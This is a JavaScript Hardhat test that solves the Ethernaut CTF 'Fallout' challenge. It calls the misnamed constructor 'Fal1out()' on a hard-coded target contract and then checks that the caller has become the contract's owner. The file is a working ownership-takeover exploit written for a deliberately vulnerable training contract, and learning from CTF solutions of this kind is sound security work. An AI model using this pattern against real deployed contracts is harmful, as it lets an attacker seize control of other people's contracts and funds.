import { ethers } from "hardhat";
import { utils } from "ethers";
import { expect } from "chai";

describe("fallout", function(){
	it("Aims to Solve the Fallout function of the Ethernaut CTF", async function(){
		this.timeout(0);

		// Initial Setup (Wallet etc..) 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();
        
        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0); // Check if the wallet amount is greater than 0 (If you have any money)

        // Define Target ABI
        const targetABI = [
            "function Fal1out() public payable ",
            "function owner() public view returns (address)",
        ]
        const targetAddr = "0x610918D09e0e148B9C48F94D9095B2d1a3233Ccb"; // Target Contract Address Here

        // Connect to the Target Contract
        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let targetCont = contract.connect(eoa);

        // The constructor has a typo and it does not use the keyword consturctor thus it can be called as a method
        let transaction = await targetCont.Fal1out();
        await transaction.wait();
        console.log(transaction);

        //Ownership Check
        let owner = await targetCont.owner();
        expect(owner).to.eq(eoa.address);

	});

});